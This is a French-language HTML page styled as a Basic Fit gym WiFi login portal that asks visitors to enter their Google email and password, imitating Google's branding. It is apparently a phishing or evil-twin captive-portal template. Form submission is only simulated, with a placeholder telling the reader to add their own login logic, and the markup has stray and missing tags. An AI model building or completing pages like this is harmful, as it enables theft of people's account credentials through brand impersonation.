<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Basic Fit - Connexion WiFi</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #FF6400 0%, #FFC72C 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 420px;
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            overflow: hidden;
            transition: transform 0.3s ease;
        }

        .container:hover {
            transform: translateY(-5px);
        }

        .header {
            background: linear-gradient(135deg, #FF6400, #FFC72C);
            padding: 30px 20px;
            text-align: center;
            color: white;
        }

        .logo-container {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
            gap: 15px;
        }

        .logo {
            width: 50px;
            height: 50px;
            fill: white;
            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.2));
        }

        .brand-name {
            font-size: 28px;
            font-weight: 700;
            letter-spacing: 1px;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
        }

        .subtitle {
            font-size: 16px;
            opacity: 0.9;
            margin-top: 10px;
        }

        .form-container {
            padding: 40px 30px;
        }

        .google-title {
            text-align: center;
            font-size: 24px;
            margin-bottom: 30px;
            color: #333;
            font-weight: 400;
        }

        .google-colors {
            color: #4285F4;
        }
        .google-colors:nth-child(2) { color: #EA4335; }
        .google-colors:nth-child(3) { color: #FBBC05; }
        .google-colors:nth-child(4) { color: #4285F4; }
        .google-colors:nth-child(5) { color: #34A853; }
        .google-colors:nth-child(6) { color: #EA4335; }

        .input-group {
            position: relative;
            margin-bottom: 25px;
        }

        .input-field {
            width: 100%;
            padding: 16px 20px;
            border: 2px solid #e1e5e9;
            border-radius: 12px;
            font-size: 16px;
            background: #fff;
            transition: all 0.3s ease;
            outline: none;
        }

        .input-field:focus {
            border-color: #FF6400;
            box-shadow: 0 0 0 3px rgba(255, 100, 0, 0.1);
            transform: translateY(-2px);
        }

        .input-field::placeholder {
            color: #999;
            transition: opacity 0.3s ease;
        }

        .input-field:focus::placeholder {
            opacity: 0.7;
        }

        .submit-btn {
            width: 100%;
            background: linear-gradient(135deg, #FF6400, #FFC72C);
            border: none;
            color: white;
            padding: 16px 20px;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
            box-shadow: 0 4px 15px rgba(255, 100, 0, 0.3);
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(255, 100, 0, 0.4);
        }

        .submit-btn:active {
            transform: translateY(0);
        }

        .footer-links {
            text-align: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #e1e5e9;
        }

        .footer-links a {
            color: #666;
            text-decoration: none;
            font-size: 14px;
            margin: 0 15px;
            transition: color 0.3s ease;
        }

        .footer-links a:hover {
            color: #FF6400;
        }

        /* Responsive Design */
        @media (max-width: 480px) {
            body {
                padding: 10px;
            }

            .container {
                max-width: 100%;
                border-radius: 15px;
            }

            .header {
                padding: 25px 15px;
            }

            .brand-name {
                font-size: 24px;
            }

            .logo {
                width: 40px;
                height: 40px;
            }

            .form-container {
                padding: 30px 20px;
            }

            .google-title {
                font-size: 20px;
                margin-bottom: 25px;
            }

            .input-field {
                padding: 14px 16px;
                font-size: 16px;
            }

            .submit-btn {
                padding: 14px 20px;
                font-size: 16px;
            }

            .footer-links {
                margin-top: 20px;
            }

            .footer-links a {
                display: block;
                margin: 10px 0;
            }
        }

        @media (min-width: 768px) {
            .container {
                max-width: 500px;
            }

            .header {
                padding: 40px 30px;
            }

            .brand-name {
                font-size: 32px;
            }

            .logo {
                width: 60px;
                height: 60px;
            }

            .form-container {
                padding: 50px 40px;
            }

            .google-title {
                font-size: 26px;
            }
        }

        @media (min-width: 1024px) {
            .container {
                max-width: 520px;
            }

            .container:hover {
                transform: translateY(-8px);
            }

            .input-field:focus {
                transform: translateY(-3px);
            }

            .submit-btn:hover {
                transform: translateY(-3px);
            }
        }

        /* Animation d'entrée */
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .container {
            animation: slideIn 0.6s ease-out;
        }

        /* Loading state */
        .submit-btn.loading {
            position: relative;
            color: transparent;
            pointer-events: none;
        }

        .submit-btn.loading::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 20px;
            height: 20px;
            margin: -10px 0 0 -10px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top: 2px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

        <div class="header">
            <div class="logo-container">

                    </g>
                </svg>
                <div class="brand-name">BASIC FIT</div>
            </div>
            <div class="subtitle">Accès WiFi Gratuit</div>
        </div>

        <div class="form-container">
            <h1 class="google-title">
                Connectez-vous avec votre compte 
                <span class="google-colors">G</span><span class="google-colors">o</span><span class="google-colors">o</span><span class="google-colors">g</span><span class="google-colors">l</span><span class="google-colors">e</span>
            </h1>

            <form id="login-form" method="post">
                <div class="input-group">
                    <input name="email" class="input-field" type="email" placeholder="Adresse e-mail" required autocomplete="email">
                </div>
                
                <div class="input-group">
                    <input name="password" class="input-field" type="password" placeholder="Mot de passe" required autocomplete="current-password">
                </div>

                <button class="submit-btn" type="submit">Continuer</button>
            </form>

            <div class="footer-links">
                <a href="#" onclick="return false;">Aide</a>
                <a href="#" onclick="return false;">Confidentialité</a>
                <a href="#" onclick="return false;">Conditions</a>
            </div>
        </div>
    </div>

    <script>
        // Animation au chargement
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('login-form');
            const submitBtn = document.querySelector('.submit-btn');
            const inputs = document.querySelectorAll('.input-field');

            // Amélioration de l'UX pour les champs de saisie
            inputs.forEach(input => {
                input.addEventListener('focus', function() {
                    this.parentElement.style.transform = 'scale(1.02)';
                });

                input.addEventListener('blur', function() {
                    this.parentElement.style.transform = 'scale(1)';
                });
            });

            // Gestion du formulaire
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                
                submitBtn.classList.add('loading');
                submitBtn.textContent = 'Connexion...';

                // Simulation d'une connexion (remplacer par votre logique)
                setTimeout(() => {
                    submitBtn.classList.remove('loading');
                    submitBtn.textContent = 'Continuer';
                    
                    // Afficher un message de succès ou rediriger
                    alert('Connexion simulée - Remplacer par votre logique de connexion');
                }, 2000);
            });

            // Validation en temps réel
            const emailInput = document.querySelector('input[name="email"]');
            const passwordInput = document.querySelector('input[name="password"]');

            emailInput.addEventListener('input', function() {
                if (this.validity.valid) {
                    this.style.borderColor = '#34A853';
                } else if (this.value.length > 0) {
                    this.style.borderColor = '#EA4335';
                }
            });

            passwordInput.addEventListener('input', function() {
                if (this.value.length >= 6) {
                    this.style.borderColor = '#34A853';
                } else if (this.value.length > 0) {
                    this.style.borderColor = '#EA4335';
                }
            });
        });

        // Gestion du responsive pour les animations
        function handleResize() {
            const container = document.querySelector('.container');
            if (window.innerWidth <= 480) {
                container.style.transform = 'none';
            }
        }

        window.addEventListener('resize', handleResize);
        handleResize(); // Appel initial
    </script>
</body>
</html>
